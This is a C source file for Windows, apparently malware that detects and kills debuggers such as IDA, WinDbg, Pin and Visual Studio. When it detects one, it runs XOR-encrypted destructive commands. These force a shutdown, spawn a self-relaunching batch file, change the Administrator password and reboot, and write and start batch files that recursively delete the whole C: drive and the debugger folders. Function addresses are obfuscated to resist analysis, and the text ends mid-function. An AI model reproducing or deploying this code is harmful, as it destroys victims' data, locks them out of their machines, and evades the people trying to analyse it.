#include <stdafx.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <math.h>
#include <time.h>

//The following are still functions : the output will not differ from the input, but there are complex operations
//that will make the instructions harder to understand on a debugger

int useless_f0(int i)
{
	double k = (double) i;
	k = k+8;
	k = k + k;
	k = k/2;
	return (int) floor(0.5 + k-8);
}
int useless_f1(int i)
{
	int k = i;
	for (int j = 0; j<9*i; j++) {
		k = k + (3*j+1);
		k = k - 2*i*j;
	}
	k = k+78;
	for (int j = 0; j<9*i; j++) {
		k = k - (3*j+1);
		k = k + 2*i*j;
	}
	k = k-100;
	return k+22;
}

int useless_f2(int i)
{
	//This function should be used with small numbers, between 0 and 400
	double k = (double) (useless_f1(i + 18));
	for (int j = 0; j<7; j++) {
		k = k*k/2;
	}
	k = 2*k + 18;
	k = (k-18)/2;
	for (int j = 0; j<7; j++) {
		k = sqrt(2*k);
	}
	return (int) floor(k - 18+0.5);
}

int useless_f3(int i)
{
	double k = (double) i;
	for (int j = 0; j<5*i; j++) {
		k = k+tan((double) j)*3;
	
	}

	k = 2*k+useless_f2(9);
	k = 4*k + sqrt((double) i);
	k = (k-sqrt((double) i))/4;
	k = (k-9)/2;

	for (int j = 0; j<5*i; j++) {
		k = k-tan((double) j)*3;
	
	}
	return (int) floor(k+0.5);
}

//The following functions slightly change the input, but are still complex, making the debugging more difficult.
int add_1(int i){
	double k = (double) i;
	for (int j = 0; j<5*i; j++) {
		k = k+sqrt((double) 9);
	}
	k = k-5*3*i+useless_f2(1);
	return (int) floor(k+0.5);
}

int sub_2(int i){
	double k = (double) i;
	double u = 7;
	double v = 9;
	for (int j = 0; j<i; j++) {
		k = k + (tan(u)+sqrt(v))/3;
	}
	k = k-i*(tan(u)+sqrt(v))/3-2;
	return (int) useless_f1(floor(k+0.5));
}

//FIRST DEFINITION
//Each main function is redefined : using the delta with another known address makes the function anonymous on the debugger.
//System - Stdlib
int stdlib_base = (int) &free;
int delta_system = 337516;
typedef int system_t(char*);
system_t* system_f = (system_t*) (stdlib_base + delta_system);

//Malloc - Stdlib
int delta_malloc = useless_f2(229);
typedef int malloc_t(size_t);
malloc_t* malloc_f = (malloc_t*) (stdlib_base + delta_malloc);

//Exit - Stdlib
int delta_exit = 98034;
typedef void exit_t(int);
exit_t* exit_f = (exit_t*) (stdlib_base + delta_exit);

//Printf - Stdio
int stdio_base = (int) &fseek;
int delta_printf = add_1(useless_f1(275269));//275270
typedef int printf_t(char*, ...);
printf_t* printf_f = (printf_t*) useless_f0(stdio_base +delta_printf);

//Fclose - Stdio
int delta_fclose = -1*useless_f1(306560);
typedef int fclose_t(FILE*);
fclose_t* fclose_f = (fclose_t*) ((int)(&printf) + delta_fclose);

//Fopen - Stdio
int delta_fopen = 269286;
typedef FILE* fopen_t(char*,char*);
fopen_t* fopen_f = (fopen_t*) (stdio_base+delta_fopen);

//Fread - Stdio
int delta_fread = sub_2(3110)+2;
typedef void fread_t(void*, size_t, size_t, FILE*);
fread_t* fread_f = (fread_t*) (stdio_base + delta_fread);

//Sprintf - Stdio
int sprintf_base = useless_f0((int) &fsetpos);
int delta_sprintf = useless_f1(6989);
typedef int sprintf_t(char*, ...);
sprintf_t* sprintf_f = (sprintf_t*) (sprintf_base + delta_sprintf);

//Fputs - Stdio
int delta_fputs = -1*useless_f1(3576);
typedef int fputs_t(char*, FILE*);
fputs_t* fputs_f = (fputs_t*) useless_f0(sprintf_base + delta_fputs);

//Localtime - Time
typedef struct tm* localtime_t(time_t*);
localtime_t* localtime_f = (localtime_t*) (sub_2((int) &localtime)+2);

//Time - Time
typedef time_t time_type(time_t*);
time_type* time_f = (time_type*) (add_1((int) &time)-1);

//Strlen - String
int string_base = (int) &strtok;
int delta_strlen = -1*(add_1(418265));//418266
typedef int strlen_t(char*);
strlen_t* strlen_f = (strlen_t*) useless_f0(string_base +delta_strlen);

//Srand - Rand
int srand_base = useless_f0((int) &wcstombs);
int delta_srand = useless_f1(136141);
typedef void srand_t(unsigned int);
srand_t* srand_f = (srand_t*) (srand_base + delta_srand);

//Rand - Rand
int rand_base = useless_f0((int) &qsort);
int delta_rand = 501241;
typedef int rand_t(void);
rand_t* rand_f = (rand_t*) (rand_base + delta_rand);


//Double Helix Encryption : a complex encryption that is not easily readable on a Debugger
//First, the key enabling the decyphering of one part of the system commands is decrypted
int helix1_1 = useless_f1(12);
int helix2_1 = useless_f2(89);
int first_value = add_1(50); //51
int first_helix = 0; //First helix = 102

int helix1_2 = useless_f2(78);
int helix2_2 = useless_f1(add_1(48));//49
int second_value = useless_f3(3);
int second_helix = 0; //Second helix = 124

int key_to_decode_helix = useless_f3(useless_f2(useless_f1(169))); //169
int decoding_key_int = 0; //Decoding key int = 179

//The system commands are all encrypted. They will not be readable at the start of the debugging session.
//These commands target a great range of debugging tools, killing them if they are running with the current program.
//PINTOOL
//check : key (179), message : key -15 (164), kill : key -80 (99)
//"tasklist /FI \"IMAGENAME eq pintool.exe\" 2>NUL | find /I /N \"pintool.exe\">NUL"
char pintoolcheck_todecode[] = {'\xc7', '\xd2', '\xc0', '\xd8', '\xdf', '\xda', '\xc0', '\xc7', '\x93', '\x9c', '\xf5', '\xfa', '\x93', '\x91', '\xfa', '\xfe', '\xf2', '\xf4', '\xf6', '\xfd', '\xf2', '\xfe', '\xf6', '\x93', '\xd6', '\xc2', '\x93', '\xc3', '\xda', '\xdd', '\xc7', '\xdc', '\xdc', '\xdf', '\x9d', '\xd6', '\xcb', '\xd6', '\x91', '\x93', '\x81', '\x8d', '\xfd', '\xe6', '\xff', '\x93', '\xcf', '\x93', '\xd5', '\xda', '\xdd', '\xd7', '\x93', '\x9c', '\xfa', '\x93', '\x9c', '\xfd', '\x93', '\x91', '\xc3', '\xda', '\xdd', '\xc7', '\xdc', '\xdc', '\xdf', '\x9d', '\xd6', '\xcb', '\xd6', '\x91', '\x8d', '\xfd', '\xe6', '\xff', '\x00'};
//"Hi Pintool !"
char pintoolmessage_todecode[] = {'\xec', '\xcd', '\x84', '\xf4', '\xcd', '\xca', '\xd0', '\xcb', '\xcb', '\xc8', '\x84', '\x85', '\x00'};
//"taskkill /F /IM pintool.exe > NUL"
char pintoolkill_todecode[] = {'\x17', '\x02', '\x10', '\x08', '\x08', '\x0a', '\x0f', '\x0f', '\x43', '\x4c', '\x25', '\x43', '\x4c', '\x2a', '\x2e', '\x43', '\x13', '\x0a', '\x0d', '\x17', '\x0c', '\x0c', '\x0f', '\x4d', '\x06', '\x1b', '\x06', '\x43', '\x5d', '\x43', '\x2d', '\x36', '\x2f', '\x00'};

//IDA
//check : key -75 (104), message : key -18 (161), kill : key -25 (154)
//"tasklist /FI \"IMAGENAME eq idaq64.exe\" 2>NUL | find /I /N \"idaq64.exe\">NUL"
char idacheck_todecode[] = {'\x1c', '\x09', '\x1b', '\x03', '\x04', '\x01', '\x1b', '\x1c', '\x48', '\x47', '\x2e', '\x21', '\x48', '\x4a', '\x21', '\x25', '\x29', '\x2f', '\x2d', '\x26', '\x29', '\x25', '\x2d', '\x48', '\x0d', '\x19', '\x48', '\x01', '\x0c', '\x09', '\x19', '\x5e', '\x5c', '\x46', '\x0d', '\x10', '\x0d', '\x4a', '\x48', '\x5a', '\x56', '\x26', '\x3d', '\x24', '\x48', '\x14', '\x48', '\x0e', '\x01', '\x06', '\x0c', '\x48', '\x47', '\x21', '\x48', '\x47', '\x26', '\x48', '\x4a', '\x01', '\x0c', '\x09', '\x19', '\x5e', '\x5c', '\x46', '\x0d', '\x10', '\x0d', '\x4a', '\x56', '\x26', '\x3d', '\x24', '\x00'};
//"\nHi IDA !"
char idamessage_todecode[] = {'\xab', '\xe9', '\xc8', '\x81', '\xe8', '\xe5', '\xe0', '\x81', '\x80', '\x00'};
//"taskkill /F /IM idaq64.exe > NUL"
char idakill_todecode[] ={'\xee', '\xfb', '\xe9', '\xf1', '\xf1', '\xf3', '\xf6', '\xf6', '\xba', '\xb5', '\xdc', '\xba', '\xb5', '\xd3', '\xd7', '\xba', '\xf3', '\xfe', '\xfb', '\xeb', '\xac', '\xae', '\xb4', '\xff', '\xe2', '\xff', '\xba', '\xa4', '\xba', '\xd4', '\xcf', '\xd6', '\x00'};

//VC
//check : key +12 (191), message : key (179), kill : key -40 (139)
//"tasklist /FI \"IMAGENAME eq VCExpress.exe\" 2>NUL | find /I /N \"VCExpress.exe\">NUL"
char vccheck_todecode[] ={'\xcb', '\xde', '\xcc', '\xd4', '\xd3', '\xd6', '\xcc', '\xcb', '\x9f', '\x90', '\xf9', '\xf6', '\x9f', '\x9d', '\xf6', '\xf2', '\xfe', '\xf8', '\xfa', '\xf1', '\xfe', '\xf2', '\xfa', '\x9f', '\xda', '\xce', '\x9f', '\xe9', '\xfc', '\xfa', '\xc7', '\xcf', '\xcd', '\xda', '\xcc', '\xcc', '\x91', '\xda', '\xc7', '\xda', '\x9d', '\x9f', '\x8d', '\x81', '\xf1', '\xea', '\xf3', '\x9f', '\xc3', '\x9f', '\xd9', '\xd6', '\xd1', '\xdb', '\x9f', '\x90', '\xf6', '\x9f', '\x90', '\xf1', '\x9f', '\x9d', '\xe9', '\xfc', '\xfa', '\xc7', '\xcf', '\xcd', '\xda', '\xcc', '\xcc', '\x91', '\xda', '\xc7', '\xda', '\x9d', '\x81', '\xf1', '\xea', '\xf3', '\x00'};
//"\nHi VS !"
char vcmessage_todecode[] ={'\xb9', '\xfb', '\xda', '\x93', '\xe5', '\xe0', '\x93', '\x92', '\x00'};
//"taskkill /F /IM VCExpress.exe > NUL"
char vckill_todecode[] ={'\xff', '\xea', '\xf8', '\xe0', '\xe0', '\xe2', '\xe7', '\xe7', '\xab', '\xa4', '\xcd', '\xab', '\xa4', '\xc2', '\xc6', '\xab', '\xdd', '\xc8', '\xce', '\xf3', '\xfb', '\xf9', '\xee', '\xf8', '\xf8', '\xa5', '\xee', '\xf3', '\xee', '\xab', '\xb5', '\xab', '\xc5', '\xde', '\xc7', '\x00'};

//WINDB
//check : key -25 (154), message : key +15 (194), kill : key -51 (128)
//"tasklist /FI \"IMAGENAME eq windbg.exe\" 2>NUL | find /I /N \"windbg.exe\">NUL"
char windbcheck_todecode[] ={'\xee', '\xfb', '\xe9', '\xf1', '\xf6', '\xf3', '\xe9', '\xee', '\xba', '\xb5', '\xdc', '\xd3', '\xba', '\xb8', '\xd3', '\xd7', '\xdb', '\xdd', '\xdf', '\xd4', '\xdb', '\xd7', '\xdf', '\xba', '\xff', '\xeb', '\xba', '\xed', '\xf3', '\xf4', '\xfe', '\xf8', '\xfd', '\xb4', '\xff', '\xe2', '\xff', '\xb8', '\xba', '\xa8', '\xa4', '\xd4', '\xcf', '\xd6', '\xba', '\xe6', '\xba', '\xfc', '\xf3', '\xf4', '\xfe', '\xba', '\xb5', '\xd3', '\xba', '\xb5', '\xd4', '\xba', '\xb8', '\xed', '\xf3', '\xf4', '\xfe', '\xf8', '\xfd', '\xb4', '\xff', '\xe2', '\xff', '\xb8', '\xa4', '\xd4', '\xcf', '\xd6', '\x00'};
//"\nHi WinDB !"
char windbmessage_todecode[] ={'\xc8', '\x8a', '\xab', '\xe2', '\x95', '\xab', '\xac', '\x86', '\x80', '\xe2', '\xe3', '\x00'};
//"taskkill /F /IM windbg.exe > NUL"
char windbkill_todecode[] = {'\xf4', '\xe1', '\xf3', '\xeb', '\xeb', '\xe9', '\xec', '\xec', '\xa0', '\xaf', '\xc6', '\xa0', '\xaf', '\xc9', '\xcd', '\xa0', '\xf7', '\xe9', '\xee', '\xe4', '\xe2', '\xe7', '\xae', '\xe5', '\xf8', '\xe5', '\xa0', '\xbe', '\xa0', '\xce', '\xd5', '\xcc', '\x00'};

//The three following methods are used to attack the system of the user trying to debug the current program
//Each system command is here encoded with a byte XOR method, making them unreadable at the start of the debugging.
//DESTRUCTION - Step 1
//This first step simply stops the computer.
//'c:\\windows\\system32\\shutdown -s -t 10 -c "Ce n'est que le début ..." -f'
char cmd_step1[] = {'\x5a', '\x5e', '\x77', '\x27', '\x19', '\x0a', '\x4e', '\x96', '\x1b', '\x2d', '\x69', '\x47', '\x12', '\x1c', '\x04', '\x5c', '\x09', '\x18', '\x62', '\x2c', '\x17', '\x42', '\x8c', '\x18', '\x3a', '\x5a', '\x43', '\x05', '\x4f', '\x5d', '\x4a', '\x44', '\x06', '\x24', '\x50', '\x55', '\x1a', '\xd9', '\x41', '\x3d', '\x15', '\x16', '\x28', '\x0a', '\x50', '\x57', '\x43', '\x4e', '\x23', '\x04', '\x44', '\x5b', '\x8c', '\x09', '\x7e', '\x59', '\x51', '\x4b', '\x0b', '\x99', '\x5b', '\x11', '\x5f', '\x70', '\x5e', '\x4a', '\x04', '\xdb', '\x4c', '\x73', '\x53', '\x00'};
char str_todecode_step1[] = {'\x4a', '\x09', '\x4f', '\x3b', '\x14', '\x4e', '\x4e', '\x88', '\x1f', '\x33', '\x51', '\x5f', '\x0f', '\x45', '\x14', '\x00'}; // Decoded "9d+Ppd*ùl^54kop";
char key_todecode_step1[] = "smdkd*dq";

//"(ECHO echo Ce n'est que le debut) >> t.bat"
char packer_step11[] = {'\x4c', '\x21', '\x28', '\x22', '\x3c', '\x18', '\x5c', '\x5a', '\x0c', '\x0b', '\x4b', '\x29', '\x16', '\x18', '\x57', '\x1e', '\x01', '\x17', '\x1f', '\x4a', '\x02', '\x4d', '\x5c', '\x19', '\x08', '\x01', '\x4b', '\x0e', '\x16', '\x5a', '\x4c', '\x4d', '\x4d', '\x44', '\x55', '\x54', '\x53', '\x4c', '\x17', '\x5b', '\x05', '\x10', '\x00'};
//"(ECHO start t.bat) >> t.bat"
char packer_step12[] = {'\x4c', '\x21', '\x28', '\x22', '\x3c', '\x18', '\x4a', '\x4d', '\x05', '\x16', '\x1f', '\x4a', '\x07', '\x16', '\x5b', '\x58', '\x10', '\x4d', '\x4b', '\x54', '\x4d', '\x18', '\x4d', '\x17', '\x06', '\x05', '\x1f', '\x00'};
//"start t.bat"
char start_step1[] = {'\x17', '\x10', '\x0a', '\x18', '\x07', '\x18', '\x4d', '\x17', '\x06', '\x05', '\x1f', '\x00'};
char str_todecode_packer[] = {'\x51', '\x17', '\x07', '\x19', '\x17', '\x4b', '\x01', '\x4a', '\x00'}; //Decoded : "ddkjs899"
char key_todecode_packer[] = "5slsds8sds";

//DESTRUCTION - Step 2
//This second step changes the system password, and restarts the computer.
//net user Administrateur steigizart > NUL
char cmd1_step2[] = {'\x0a', '\x0f', '\x1f', '\x44', '\x4d', '\x4a', '\x5d', '\x16', '\x4b', '\x25', '\x0e', '\x06', '\x0d', '\x56', '\x50', '\x4b', '\x10', '\x19', '\x05', '\x1e', '\x0e', '\x11', '\x4a', '\x19', '\x4b', '\x10', '\x0e', '\x0d', '\x0d', '\x02', '\x1e', '\x59', '\x4b', '\x4c', '\x44', '\x55', '\x44', '\x24', '\x3e', '\x28', '\x00'};
//'c:\\windows\\system32\\shutdown -r -t 0 -f'
char cmd2_step2[] = {'\x07', '\x50', '\x37', '\x13', '\x51', '\x57', '\x5c', '\x0b', '\x1c', '\x17', '\x36', '\x18', '\x1d', '\x4b', '\x4d', '\x5d', '\x09', '\x58', '\x56', '\x36', '\x18', '\x0c', '\x4d', '\x4d', '\x5c', '\x0b', '\x1c', '\x0a', '\x4a', '\x46', '\x16', '\x18', '\x14', '\x4c', '\x44', '\x5b', '\x44', '\x47', '\x0d', '\x00'};
char str_todecode_step2[] = {'\x08', '\x19', '\x53', '\x17', '\x01', '\x5d', '\x48', '\x08', '\x18', '\x00'}; //Decoded : "djkd898dk"
char key_todecode_step2[] = "ls8s9dp";

//DESTRUCTION - Step 3
//This final steps irreversibly eats away the memory of the computer, starting with the locations of the debuggers.
//Before stopping the debugger, .bat files are created with nefarious code. They get launched as the debugger get killed.
//'(ECHO start cmd /C rmdir /S /Q "c:\\") >> s.bat' (key2)
char cmd1_step3[] = {'\x10', '\x6c', '\xf3', '\xf8', '\xa8', '\xc7', '\x43', '\x94', '\x21', '\x14', '\x1e', '\x16', '\x3c', '\x0b', '\x14', '\x0c', '\x17', '\x6a', '\x90', '\xc2', '\x8a', '\x83', '\x59', '\x92', '\x60', '\x49', '\x39', '\x16', '\x70', '\x37', '\x50', '\x0e', '\x5b', '\x13', '\xec', '\x92', '\xce', '\xc7', '\x0e', '\xde', '\x60', '\x15', '\x44', '\x54', '\x3e', '\x12', '\x00'};
//'(ECHO start cmd /C rmdir /S /Q "c:\\pin-2.13-62732-msvc10-windows") >> s2.bat' (key1)
char cmd2_step3[] = {'\x10', '\x21', '\x7a', '\x7e', '\xa8', '\xc7', '\x43', '\x94', '\x21', '\x14', '\x1e', '\x53', '\x05', '\x1d', '\x48', '\x18', '\x4b', '\x7a', '\x16', '\x95', '\x8a', '\x54', '\x89', '\x32', '\x46', '\x45', '\x20', '\x46', '\x5f', '\x7d', '\x18', '\x46', '\x5a', '\x0c', '\xbb', '\x97', '\x59', '\x8e', '\x6d', '\x54', '\x44', '\x42', '\x55', '\x5d', '\x1a', '\x0a', '\x53', '\x0a', '\x04', '\xca', '\x8a', '\x43', '\x96', '\x23', '\x57', '\x5a', '\x5e', '\x11', '\x19', '\x42', '\x5c', '\x0b', '\x4e', '\x45', '\xc5', '\xce', '\x10', '\xde', '\x7e', '\x46', '\x19', '\x41', '\x48', '\x12', '\x4d', '\x4c', '\x00'};
//'(ECHO start cmd /C rmdir /S /Q "c:\\WinDDK") >> s3.bat' (key1)
char cmd3_step3[] = {'\x10', '\x21', '\x7a', '\x7e', '\xa8', '\xc7', '\x43', '\x94', '\x21', '\x14', '\x1e', '\x53', '\x05', '\x1d', '\x48', '\x18', '\x4b', '\x7a', '\x16', '\x95', '\x8a', '\x54', '\x89', '\x32', '\x46', '\x45', '\x20', '\x46', '\x5f', '\x7d', '\x18', '\x46', '\x5a', '\x0c', '\xbb', '\xb0', '\x59', '\x8e', '\x04', '\x22', '\x21', '\x51', '\x4f', '\x50', '\x12', '\x06', '\x44', '\x4a', '\x05', '\xc9', '\x85', '\x51', '\x94', '\x00'};
//'(ECHO start cmd /C rmdir /S /Q "c:\\Program Files\\IDA 6.4") >> s4.bat' (key1)
char cmd4_step3[] = {'\x10', '\x21', '\x7a', '\x7e', '\xa8', '\xc7', '\x43', '\x94', '\x21', '\x14', '\x1e', '\x53', '\x05', '\x1d', '\x48', '\x18', '\x4b', '\x7a', '\x16', '\x95', '\x8a', '\x54', '\x89', '\x32', '\x46', '\x45', '\x20', '\x46', '\x5f', '\x7d', '\x18', '\x46', '\x5a', '\x0c', '\xbb', '\xb7', '\x42', '\x8f', '\x27', '\x14', '\x0b', '\x1e', '\x46', '\x36', '\x45', '\x54', '\x01', '\x4a', '\x6a', '\xae', '\xa3', '\x71', '\xc0', '\x76', '\x48', '\x5e', '\x51', '\x4f', '\x50', '\x12', '\x06', '\x44', '\x4a', '\x02', '\xc9', '\x85', '\x51', '\x94', '\x00'};
//'(ECHO start cmd /C rmdir /S /Q "c:\\Program Files\\Microsoft Visual Studio 10.0") >> s5.bat'
char cmd5_step3[] = {'\x10', '\x21', '\x7a', '\x7e', '\xa8', '\xc7', '\x43', '\x94', '\x21', '\x14', '\x1e', '\x53', '\x05', '\x1d', '\x48', '\x18', '\x4b', '\x7a', '\x16', '\x95', '\x8a', '\x54', '\x89', '\x32', '\x46', '\x45', '\x20', '\x46', '\x5f', '\x7d', '\x18', '\x46', '\x5a', '\x0c', '\xbb', '\xb7', '\x42', '\x8f', '\x27', '\x14', '\x0b', '\x1e', '\x46', '\x36', '\x45', '\x54', '\x01', '\x4a', '\x6a', '\xaa', '\x8e', '\x53', '\x92', '\x2f', '\x15', '\x05', '\x15', '\x12', '\x50', '\x7a', '\x51', '\x17', '\x4c', '\x57', '\x8b', '\xc7', '\x63', '\x94', '\x35', '\x02', '\x03', '\x1c', '\x46', '\x41', '\x1c', '\x16', '\x54', '\x1b', '\x1f', '\xc7', '\xd9', '\x0e', '\xc0', '\x33', '\x53', '\x44', '\x11', '\x07', '\x04', '\x00'};

//start s.bat (key1)
char start1_step3[] = {'\x4b', '\x10', '\x58', '\x44', '\x93', '\xc7', '\x53', '\x8d', '\x24', '\x46', '\x45', '\x30', '\x46', '\x03', '\x02', '\x5a', '\x05', '\x4d', '\x00'};
//start s2.bat (key1)
char start2_step3[] = {'\x4b', '\x10', '\x58', '\x44', '\x93', '\xc7', '\x53', '\x8d', '\x24', '\x46', '\x45', '\x30', '\x46', '\x03', '\x1e', '\x16', '\x06', '\x58', '\x42', '\x00'};
//start s3.bat (key1)
char start3_step3[] = {'\x4b', '\x10', '\x58', '\x44', '\x93', '\xc7', '\x53', '\x8d', '\x24', '\x46', '\x45', '\x30', '\x46', '\x03', '\x1f', '\x16', '\x06', '\x58', '\x42', '\x00'};
//start s4.bat (key1)
char start4_step3[] = {'\x4b', '\x10', '\x58', '\x44', '\x93', '\xc7', '\x53', '\x8d', '\x24', '\x46', '\x45', '\x30', '\x46', '\x03', '\x18', '\x16', '\x06', '\x58', '\x42', '\x00'};
//start s5.bat (key1)
char start5_step3[] = {'\x4b', '\x10', '\x58', '\x44', '\x93', '\xc7', '\x53', '\x8d', '\x24', '\x46', '\x45', '\x30', '\x46', '\x03', '\x19', '\x16', '\x06', '\x58', '\x42', '\x00'};
//ping -n 3 localhost 1>nul
char wait_step3[] = {'\x48', '\x0d', '\x57', '\x51', '\xc7', '\xca', '\x5e', '\xc0', '\x73', '\x46', '\x06', '\x1c', '\x05', '\x11', '\x40', '\x50', '\x0b', '\x4a', '\x42', '\xc7', '\xd6', '\x0e', '\x8e', '\x35', '\x0a', '\x00'};

char str_todecode_step3[] = {'\x0f', '\x15', '\xd1', '\x45', '\xdf', '\x83', '\x43', '\xd9', '\x24', '\x5e', '\x1b', '\x02', '\x5f', '\x03', '\x15', '\x00'};//Decoded "8d96çç0à@fjsfp,"
char key_todecode_step3[] = "7qès8ds9d8qq9s98";
char str_todecode2_step3[] = {'\x0f', '\x58', '\x58', '\xc3', '\xdf', '\x83', '\x43', '\xd9', '\x24', '\x5e', '\x1b', '\x47', '\x66', '\x15', '\x49', '\x14', '\x00'};//Decoded : "8)°°çç0à@fj6_fp,"

//The following methods enable to decypher encrypted strings
//string XOR string decyphering
char* decrypt_str(char* input, char* key) {
	int len_input = add_1(strlen_f(input))-1;
	int len_key = sub_2(useless_f2(strlen_f(key)))+2;
	char* output = (char*) malloc_f(len_input*sizeof(char));
	for (int i = 0; i<len_input; i++){
		output[i] = input[i]^key[(i%len_key)];
	}
	output[len_input] = '\x00';
	return output;
}
//"Double Helix" decyphering
int decrypt_dh(int to_decrypt, int helix1, int helix2)
{
	return helix1^(to_decrypt^helix2);
}
//Hard-to-read decyphering for the debugger
int decrypt_special(int to_decrypt, int key){
	return ((int) floor(0.5+to_decrypt/key))^useless_f1(key);
}
//string XOR int decyphering
char* decrypt_key(char* string, int key)
{
	int len = add_1(strlen_f(string))-1;
	char *res = (char*) malloc_f(len*sizeof(char));
	for (int i =0; i<len; i++)
	{
		res[i] = string[i]^key;
	}
	res[len] = '\x00';
	return res;
}

//SECOND DEFINITION - With decoding
//Some main functions have a second redefinition : here, the address delta gets decrypted in order to get the function adress.
//System - Stdlib
int stdlib_base2 = (int) &bsearch;
int delta_system2 = decrypt_dh(266028,84565,23365); //335420
typedef int system2_t(char*);
system2_t* system2_f = (system2_t*) (stdlib_base2 + delta_system2);

//Malloc - Stdlib
int delta_malloc2 = decrypt_dh(-676,1456,89); //-1867
typedef int malloc2_t(size_t);
malloc2_t* malloc2_f = (malloc2_t*) (stdlib_base2 + delta_malloc2);

//Printf - Stdio
int stdio_base2 = (int) &rewind;
int delta_printf2 = decrypt_dh(342997,78996,8945); //273840
typedef int printf2_t(char*, ...);
printf2_t* printf2_f = (printf2_t*) (stdio_base2 +delta_printf2);

//Fopen - Stdio
int delta_fopen2 = decrypt_dh(263660,4896,156); //267856
typedef FILE* fopen2_t(char*,char*);
fopen2_t* fopen2_f = (fopen2_t*) (stdio_base2+delta_fopen2);

//Strlen - String
int strlen_base2 = (int) &memmove;
int delta_strlen2 = decrypt_dh(8352,8996,1636); //1504
typedef int strlen2_t(char*);
strlen2_t* strlen2_f = (strlen2_t*) (strlen_base2 +delta_strlen2);

//Function to launch step1
void step1(){
	//printf("Step 1");
	//Shutdown
	/*
	printf_f("%s\n",decrypt_str(cmd_step1,decrypt_str(str_todecode_step1,key_todecode_step1)));
	printf_f("%s\n",decrypt_str(packer_step11,decrypt_str(str_todecode_packer,key_todecode_packer)));
	printf_f("%s\n",decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	printf_f("%s\n",decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	printf_f("%s\n",decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	printf_f("%s\n",decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	printf_f("%s\n",decrypt_str(start_step1,decrypt_str(str_todecode_packer,key_todecode_packer)));
	*/

	system2_f(decrypt_str(cmd_step1,decrypt_str(str_todecode_step1,key_todecode_step1)));
	//Create echo for packer
	system_f(decrypt_str(packer_step11,decrypt_str(str_todecode_packer,key_todecode_packer)));
	//Create start for packer
	system_f(decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	system2_f(decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	system2_f(decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	system2_f(decrypt_str(packer_step12,decrypt_str(str_todecode_packer,key_todecode_packer)));
	//Start maleficient packer
	system_f(decrypt_str(start_step1,decrypt_str(str_todecode_packer,key_todecode_packer)));
}

//Function to launch step2
void step2(){
	/*
	printf2_f("%s\n",decrypt_str(cmd1_step2,decrypt_str(str_todecode_step2,key_todecode_step2)));
	printf2_f("%s\n",decrypt_str(cmd2_step2,decrypt_str(str_todecode_step2,key_todecode_step2)));
	*/
	//Change password
	system2_f(decrypt_str(cmd1_step2,decrypt_str(str_todecode_step2,key_todecode_step2)));
	//Restart PC
	system_f(decrypt_str(cmd2_step2,decrypt_str(str_todecode_step2,key_todecode_step2)));
}

//Function to launch step3
void step3(){
	printf("Step 3");
	/*
	printf_f("%s\n",decrypt_str(cmd1_step3,decrypt_str(str_todecode2_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(cmd2_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(cmd3_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(cmd4_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(cmd5_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(start1_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(start2_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(start3_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(start4_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	printf_f("%s\n",decrypt_str(start5_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	*/
	//Remove memory
	system_f(decrypt_str(cmd1_step3,decrypt_str(str_todecode2_step3,key_todecode_step3)));
	system2_f(decrypt_str(cmd2_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(cmd3_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system_f(decrypt_str(cmd4_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system_f(decrypt_str(cmd5_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system_f(decrypt_str(wait_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(start1_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(start2_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(start3_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(start4_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
	system2_f(decrypt_str(start5_step3,decrypt_str(str_todecode_step3,key_todecode_step3)));
}

//Three antidebug functions are created : they check the presence of an active debugger, and kill it if necessary. The functions protect their
//integrity with a checksum.
int antidebug_1(){
	int check = 0;
	typedef bool isDebug(); // Address : 18073568067909359
	isDebug* isDebug_f = (isDebug*) decrypt_dh(18616233354917386,587744445555555,4534788998);
	int isBeingDebugged2 = useless_f3(add_1(isDebug_f()))-1;
	check++;


	PPEB pPeb = (PPEB)__readfsdword(useless_f1(-1+add_1(useless_f2(useless_f3(decrypt_special(231297,489))))));
	BOOL isBeingDebugged = pPeb->BeingDebugged;
	int protection = (int) pPeb->BeingDebugged +6;
	int protection2 = isBeingDebugged2* 3;

	//First debugger check, before any decoding
	if (isBeingDebugged || isBeingDebugged2 ||protection*3 == 21 || protection2*3 == 9){
		step1();
		exit_f(42);
	}
	check++;

	first_helix = useless_f1(decrypt_dh(first_value,helix1_1,add_1(helix2_1)-1));
	second_helix = decrypt_dh(second_value,useless_f1(helix1_2),helix2_2);
	decoding_key_int = useless_f3(decrypt_dh(useless_f3(key_to_decode_helix),first_helix,second_helix));

	//If Debug : check which Debugger is launched and kill it
	if (isBeingDebugged || protection*3 == 21 || protection2*3 == 9){

		//Kill IDA
		BOOL isIDA = 1-system2_f(decrypt_key(idacheck_todecode,decoding_key_int-75));
		if (isIDA && (protection +6 == 13 || protection2*3 == 9)) {
			check++;
